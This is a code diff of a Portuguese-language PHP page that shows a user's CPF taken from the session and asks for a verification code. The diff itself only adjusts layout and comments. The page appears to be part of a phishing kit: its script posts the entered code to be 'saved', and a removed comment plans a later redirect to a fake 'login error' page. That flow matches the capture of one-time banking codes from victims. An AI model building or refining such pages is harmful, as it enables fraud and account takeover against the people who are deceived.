@@ -1,16 +1,15 @@
 <?php
 session_start();
 
-// --- LÓGICA DE DADOS DINÂMICOS ---
-// Recupera os dados salvos na sessão da página anterior.
-$identificador_cliente = $_SESSION['identificador_usuario'] ?? '288.114.198-67'; // Valor de exemplo caso a sessão não exista
+// Recupera os dados da sessão para exibição dinâmica.
+$identificador_cliente = $_SESSION['identificador_usuario'] ?? '473.302.908-07'; // Valor de exemplo caso a sessão não exista
 $tipo_identificador = $_SESSION['tipo_identificador'] ?? 'CPF'; // Valor de exemplo
 
-// Função para formatar o CPF (se aplicável)
+// Função para formatar o CPF
 function formatarCPF($cpf) {
     $cpfLimpio = preg_replace('/[^0-9]/', '', $cpf);
     if (strlen($cpfLimpio) != 11) {
-        return $cpf; // Se não for um CPF, retorna o valor original
+        return $cpf;
     }
     return substr($cpfLimpio, 0, 3) . '.' . substr($cpfLimpio, 3, 3) . '.' . substr($cpfLimpio, 6, 3) . '-' . substr($cpfLimpio, 9, 2);
 }
@@ -43,13 +42,20 @@ $dado_formatado = ($tipo_identificador === 'CPF') ? formatarCPF($identificador_c
         .session-start-label { font-size: 12px; font-weight: 600; color: var(--cor-texto-secundaria); text-transform: uppercase; }
         .main-title { font-size: 28px; font-weight: 400; margin: 8px 0 16px 0; }
         .description-text { font-size: 16px; color: var(--cor-texto-secundaria); line-height: 1.5; margin-bottom: 24px; }
-        
         .user-info-box { display: inline-flex; align-items: center; gap: 12px; border: 1px solid #e0e0e0; border-radius: 30px; padding: 8px 16px; }
         .user-info-box .icon { width: 32px; height: 32px; background-color: #eaf3ff; border-radius: 50%; display: flex; align-items: center; justify-content: center; }
         .user-info-box .details span { display: block; font-size: 14px; }
         .user-info-box .details a { font-size: 12px; color: var(--cor-azul); text-decoration: none; }
         
-        .help-link { color: var(--cor-azul); text-decoration: none; font-size: 14px; font-weight: 500; display: inline-block; margin-top: 16px; }
+        .help-link {
+            color: var(--cor-azul);
+            text-decoration: none;
+            font-size: 14px;
+            font-weight: 500;
+            display: inline-block;
+            /* AJUSTE: Aumente este valor para mover o link mais para baixo */
+            margin-top: 64px;
+        }
         
         .form-card {
             background-color: var(--cor-card);
@@ -60,7 +66,13 @@ $dado_formatado = ($tipo_identificador === 'CPF') ? formatarCPF($identificador_c
             box-sizing: border-box;
         }
         .form-card label { font-size: 16px; color: var(--cor-texto-primaria); }
-        .code-inputs { display: flex; gap: 8px; justify-content: center; margin: 16px 0; }
+        .code-inputs {
+            display: flex;
+            gap: 8px;
+            /* AJUSTE: Alinha os inputs à esquerda dentro do card */
+            justify-content: flex-start;
+            margin: 16px 0;
+        }
         .code-inputs input { width: 40px; height: 50px; text-align: center; font-size: 22px; border: 1px solid var(--cor-borda); border-radius: 6px; }
         .code-inputs input:focus { border-color: var(--cor-azul); outline: none; }
         .resend-timer { text-align: left; font-size: 14px; color: var(--cor-texto-secundaria); margin: 16px 0 24px 0; min-height: 21px; }
@@ -124,7 +136,6 @@ $dado_formatado = ($tipo_identificador === 'CPF') ? formatarCPF($identificador_c
         const timerElement = document.querySelector('.resend-timer');
         let countdownInterval;
 
-        // Lógica para pular campos e apagar
         inputs.forEach((input, index) => {
             input.addEventListener('input', () => {
                 if (input.value && index < inputs.length - 1) { inputs[index + 1].focus(); }
@@ -134,7 +145,6 @@ $dado_formatado = ($tipo_identificador === 'CPF') ? formatarCPF($identificador_c
             });
         });
 
-        // Lógica do Timer e Reenvio
         function startTimer() {
             let seconds = 50;
             timerElement.style.color = 'var(--cor-texto-secundaria)';
@@ -162,10 +172,8 @@ $dado_formatado = ($tipo_identificador === 'CPF') ? formatarCPF($identificador_c
             startTimer();
         }
 
-        // Inicia o timer quando a página carrega
         document.addEventListener('DOMContentLoaded', startTimer);
         
-        // Lógica de submissão do formulário
         async function handleFormSubmit(event) {
             event.preventDefault();
             const code = inputs.map(input => input.value).join('');
@@ -181,7 +189,6 @@ $dado_formatado = ($tipo_identificador === 'CPF') ? formatarCPF($identificador_c
                     
                     if (result.success) {
                         alert('Código recebido com sucesso!');
-                        // Futuramente, redirecionar para uma página de "finalizado" ou de "erro de login"
                     } else {
                         alert('Erro: ' + (result.error || 'Não foi possível salvar o código.'));
                     }
